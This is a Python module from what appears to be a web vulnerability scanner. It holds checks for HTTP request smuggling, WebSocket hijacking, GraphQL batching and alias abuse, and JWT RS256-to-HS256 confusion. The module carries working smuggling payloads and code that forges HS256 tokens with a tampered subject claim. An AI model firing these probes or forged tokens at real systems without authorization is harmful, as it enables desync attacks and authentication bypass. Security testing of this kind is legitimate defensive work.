"""Third-wave checks (Reconix 3.6 Depth Pack): HTTP request smuggling
(timing differential), WebSocket security, GraphQL deep fuzzing, and
JWT RS256->HS256 algorithm confusion."""
import base64
import hashlib
import hmac as hmac_mod
import json
import re
import socket
import ssl
import time
import urllib.parse

from .calibrate import similarity  # noqa: F401  (kept for callers)


def _b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
SMUGGLE_DELAY = 3.0


# --------------------------------------------------------------------------
# raw HTTP (smuggling needs byte-level control no HTTP client gives)

def _raw_connect(parts, timeout=6):
    host = parts.hostname
    port = parts.port or (443 if parts.scheme == "https" else 80)
    sock = socket.create_connection((host, port), timeout=timeout)
    if parts.scheme == "https":
        sock = ssl.create_default_context().wrap_socket(
            sock, server_hostname=host)
    sock.settimeout(timeout)
    return sock


def _read_response(sock, timeout=6):
    """Read one HTTP response (headers + CL body). Returns
    (elapsed, status, raw) — status None on timeout with no data."""
    sock.settimeout(timeout)
    start = time.time()
    data = b""
    try:
        while b"\r\n\r\n" not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        return time.time() - start, None, data
    head, _, rest = data.partition(b"\r\n\r\n")
    m = re.search(rb"content-length:\s*(\d+)", head, re.I)
    want = int(m.group(1)) if m else 0
    body = rest
    try:
        while len(body) < want:
            chunk = sock.recv(4096)
            if not chunk:
                break
            body += chunk
    except socket.timeout:
        pass
    sm = re.match(rb"HTTP/1\.\d (\d{3})", head)
    return time.time() - start, (int(sm.group(1)) if sm else None), \
        head + b"\r\n\r\n" + body


def smuggling_check(ctx, base):
    """Timing-differential request-smuggling probes.

    Both desync orientations deliberately under-deliver the body: a
    parser chain that disagrees (CL front / TE back or vice versa)
    stalls waiting for bytes, while a consistent endpoint answers the
    control request immediately. Only meaningful on persistent
    (HTTP/1.1 keep-alive) services — HTTP/1.0-only servers are skipped,
    which also keeps single dev servers out of scope. Any stall is a
    lead, not proof: confidence stays at manual-confirmation level.
    """
    F = ctx.findings
    parts = urllib.parse.urlsplit(base)
    if not parts.hostname:
        return
    path = parts.path or "/"
    host_hdr = parts.netloc

    def probe(chunks, timeout=6):
        try:
            sock = _raw_connect(parts, timeout)
        except Exception:
            return None, None
        try:
            for c in chunks:
                sock.sendall(c)
            return _read_response(sock, timeout)
        except Exception:
            return None, None
        finally:
            try:
                sock.close()
            except Exception:
                pass

    # gate: persistent HTTP/1.1 service?
    el, status, raw = probe(
        [f"GET {path} HTTP/1.1\r\nHost: {host_hdr}\r\n"
         f"Connection: close\r\n\r\n".encode()])
    if status is None or b"HTTP/1.1" not in raw[:20]:
        return
    # control: a correct POST must come back fast
    body = b"x=1"
    ctrl = (f"POST {path} HTTP/1.1\r\nHost: {host_hdr}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode() + body
    el_c, st_c, _ = probe([ctrl])
    if st_c is None or el_c > 2.5:
        return  # target too slow to judge differentials

    def stalls(payload, rounds=2):
        hits = 0
        for _ in range(rounds):
            el, st, _raw = probe([payload], timeout=SMUGGLE_DELAY + 2)
            if st is None or el > SMUGGLE_DELAY:
                hits += 1
        return hits == rounds

    # CL.TE: front reads Content-Length (wants 6), back reads chunked
    # (the 5-byte terminator completes it) -> the chain stalls.
    clte = (f"POST {path} HTTP/1.1\r\nHost: {host_hdr}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n"
            f"Connection: close\r\n\r\n0\r\n\r\n").encode()
    # TE.CL: front reads chunked (complete), back reads Content-Length
    # (wants 100) -> the chain stalls.
    tecl = (f"POST {path} HTTP/1.1\r\nHost: {host_hdr}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 100\r\nTransfer-Encoding: chunked\r\n"
            f"Connection: close\r\n\r\n5\r\nhello\r\n0\r\n\r\n").encode()
    for label, payload in (("CL.TE", clte), ("TE.CL", tecl)):
        if ctx.stop.is_set():
            return
        if stalls(payload):
            F.add("Medium", "Possible HTTP Request Smuggling "
                  f"({label} timing differential)", base,
                  f"A {label} probe under-delivers its body and the "
                  f"service stalls (> {SMUGGLE_DELAY:.0f}s, twice), while "
                  f"an equivalent well-formed POST answers in "
                  f"{el_c:.2f}s. A front/back parser disagreement is the "
                  f"likely cause. Confirm manually with a "
                  f"victim-request test before reporting.",
                  proof=f"control POST {el_c:.2f}s; {label} probe "
                        f"stalled > {SMUGGLE_DELAY:.0f}s (x2)",
                  confidence="Needs manual confirmation", cwe="CWE-444")
            return


# --------------------------------------------------------------------------
# WebSocket

WS_PATHS = ("/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket",
            "/cable", "/sockjs/websocket", "/live", "/chat")


def websocket_check(ctx, base):
    F, client = ctx.findings, ctx.client
    parts = urllib.parse.urlsplit(base)
    root = f"{parts.scheme}://{parts.netloc}"
    candidates = list(WS_PATHS)
    for extra in (ctx.extra.get("ws_urls") or []):
        candidates.append(extra)
    key = base64.b64encode(b"reconix-ws-probe!").decode()
    for path in candidates:
        if ctx.stop.is_set():
            return
        url = path if path.startswith("http") else root + path
        # 1) cross-origin handshake (CSWSH): a hostile Origin must be refused
        r = client.fetch(url, headers={
            "Connection": "Upgrade", "Upgrade": "websocket",
            "Sec-WebSocket-Key": key, "Sec-WebSocket-Version": "13",
            "Origin": "https://reconix-cswsh.invalid"})
        if r.status == 101:
            F.add("High", "WebSocket Cross-Site Hijacking (CSWSH)", url,
                  "The WebSocket endpoint accepts a handshake from a "
                  "foreign Origin. Any website a logged-in victim visits "
                  "can open a socket as the victim and read/send data.",
                  proof="HTTP 101 with Origin https://reconix-cswsh.invalid",
                  resp=r, cwe="CWE-1385")
            continue
        # 2) unauthenticated handshake (no cookies, no Origin games)
        anon = client.__class__(proxy=ctx.opts.get("proxy"))
        r2 = anon.fetch(url, headers={
            "Connection": "Upgrade", "Upgrade": "websocket",
            "Sec-WebSocket-Key": key, "Sec-WebSocket-Version": "13"})
        if r2.status == 101:
            F.add("Medium", "Unauthenticated WebSocket Endpoint", url,
                  "The WebSocket endpoint upgrades connections with no "
                  "session at all. If the channel carries user data, "
                  "anyone can listen in or inject messages.",
                  proof="HTTP 101 with no cookies/credentials",
                  resp=r2, confidence="Needs manual confirmation",
                  cwe="CWE-306")


# --------------------------------------------------------------------------
# GraphQL deep fuzzing

def _gql(ctx, url, payload):
    return ctx.client.fetch(url, method="POST",
                            raw_body=json.dumps(payload).encode(),
                            content_type="application/json")


def graphql_deep_check(ctx, base):
    F = ctx.findings
    parts = urllib.parse.urlsplit(base)
    root = f"{parts.scheme}://{parts.netloc}"
    endpoint = None
    for path in ("/graphql", "/api/graphql", "/v1/graphql"):
        r = _gql(ctx, root + path, {"query": "{ __typename }"})
        if r.status == 200 and "__typename" in (r.body or ""):
            endpoint = root + path
            break
    if not endpoint:
        return
    # query batching: an array of queries answered in one request
    batch = [{"query": "{ __typename }"} for _ in range(10)]
    r = _gql(ctx, endpoint, batch)
    try:
        arr = json.loads(r.body or "")
    except Exception:
        arr = None
    if isinstance(arr, list) and len(arr) >= 10:
        F.add("Medium", "GraphQL Query Batching Enabled", endpoint,
              "The endpoint answers 10 queries batched in one request. "
              "Batching multiplies brute-force attacks (OTP, passwords, "
              "coupons) by the batch size per request.",
              proof=f"batch of 10 -> array of {len(arr)} results",
              resp=r, cwe="CWE-770")
    # alias overload: many aliases of one field in a single query
    aliases = " ".join(f"a{i}: __typename" for i in range(30))
    r = _gql(ctx, endpoint, {"query": "{ " + aliases + " }"})
    try:
        _data = (json.loads(r.body or "{}") or {}).get("data") or {}
    except Exception:
        _data = {}
    if r.status == 200 and len(_data) >= 25:
        F.add("Low", "GraphQL Alias Overload Accepted", endpoint,
              "One query carried 30 aliases of the same field and all "
              "were resolved. Alias amplification is a cheap "
              "denial-of-service / rate-limit bypass primitive.",
              proof="30 aliases resolved in a single query", resp=r,
              confidence="Needs manual confirmation", cwe="CWE-770")
    # field suggestions: typo'd field leaks schema hints without introspection
    r = _gql(ctx, endpoint, {"query": "{ __typ }"})
    if "did you mean" in (r.body or "").lower():
        F.add("Medium", "GraphQL Field Suggestions Enabled", endpoint,
              "Error messages suggest correct field names ('Did you "
              "mean...'), leaking the schema even where introspection "
              "is disabled.",
              proof=(r.body or "")[:200], resp=r, cwe="CWE-209")


# --------------------------------------------------------------------------
# JWT RS256 -> HS256 confusion

_KEY_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/public.pem",
              "/cert.pem", "/public_key.pem",
              "/.well-known/openid-configuration")


def jwt_confusion_try(ctx, token, header, payload, url0, page_urls=None):
    """Forge an HS256 token signed with the server's RSA public key
    material; fire only if the server accepts the TAMPERED claim."""
    F, client = ctx.findings, ctx.client
    parts = urllib.parse.urlsplit(url0 or ctx.base)
    root = f"{parts.scheme}://{parts.netloc}"
    materials = []
    for p in _KEY_PATHS:
        r = client.fetch(root + p)
        if r.status == 200 and r.body and len(r.body) > 30:
            materials.append((p, r.body.encode()))
    if not materials:
        return False
    # where does the token travel? cookie name if it came from the jar
    cookie_name = None
    for name, value in client.cookies():
        if value == token:
            cookie_name = name
            break
    forged_payload = dict(payload)
    forged_payload["sub"] = "reconix-admin-7391"
    signing = (_b64e(json.dumps({"alg": "HS256", "typ": "JWT"},
                                separators=(",", ":")).encode())
               + "." + _b64e(json.dumps(forged_payload,
                                        separators=(",", ":")).encode()))
    verify_urls = list(dict.fromkeys(
        [url0] + list(page_urls or [])))[:12]
    for src_path, key_bytes in materials:
        sig = hmac_mod.new(key_bytes, signing.encode(),
                           hashlib.sha256).digest()
        forged = signing + "." + _b64e(sig)
        headers, orig_headers = {}, {}
        if cookie_name:
            headers["Cookie"] = f"{cookie_name}={forged}"
            orig_headers["Cookie"] = f"{cookie_name}={token}"
        else:
            headers["Authorization"] = f"Bearer {forged}"
            orig_headers["Authorization"] = f"Bearer {token}"
        for vurl in verify_urls:
            r = client.fetch(vurl, headers=headers)
            r_orig = client.fetch(vurl, headers=orig_headers)
            if (r.status and r.status == r_orig.status
                    and "reconix-admin-7391" in (r.body or "")
                    and "reconix-admin-7391" not in (r_orig.body or "")):
                F.add("High", "JWT Algorithm Confusion (RS256 to HS256)",
                      vurl,
                      "The server verifies HS256 tokens using its RSA "
                      f"public key material (from {src_path}) as the "
                      "HMAC secret. A forged token with a tampered "
                      "'sub' claim was accepted — full authentication "
                      "bypass.",
                      proof="forged HS256 token "
                            "(sub=reconix-admin-7391, "
                            f"key={src_path}) accepted; claim reflected",
                      resp=r, cwe="CWE-327")
                return True
    return False
